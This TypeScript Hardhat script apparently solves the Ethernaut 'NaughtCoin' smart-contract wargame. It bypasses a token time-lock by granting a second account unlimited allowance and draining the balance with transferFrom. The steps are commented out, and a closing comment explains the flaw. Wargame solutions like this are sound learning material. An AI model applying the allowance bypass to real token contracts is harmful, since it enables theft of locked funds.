import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/15.NaughtCoin/NaughtCoin.sol/NaughtCoin.json";
import { BigNumber, Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { sendEther } from "utils/sendEther";

function setTargetContract() {
  const contractAddress = "0xD108C3352f9F0E335Eb141c37AB668478A12A543";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const balance = await target.connect(attacker).balanceOf(attacker.address);
  console.log(balance);
  console.log("Success: ", BigNumber.from(balance).isZero());
}

async function main() {
  console.log("configure recipient");

  // const [attacker, recipient] = await ethers.getSigners();
  // const NaughtCoin = setTargetContract();
  // let tx = await NaughtCoin.connect(attacker).approve(
  //   recipient.address,
  //   ethers.constants.MaxUint256
  // );
  // await tx.wait();
  // const balance = await NaughtCoin.connect(attacker).balanceOf(
  //   attacker.address
  // );

  // tx = await attacker.sendTransaction({
  //   to: recipient.address,
  //   value: ethers.utils.parseEther("0.001"),
  // });
  // await tx.wait();
  // tx = await NaughtCoin.connect(recipient).transferFrom(
  //   attacker.address,
  //   recipient.address,
  //   balance
  // );
  // await tx.wait();
  // checkSucces(attacker, NaughtCoin);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// The contract protected the transfer function, but you can also
// transfer an ERC20 using transferFrom, just set the allowance to INTMAX for
// a contract your control or an eoa;
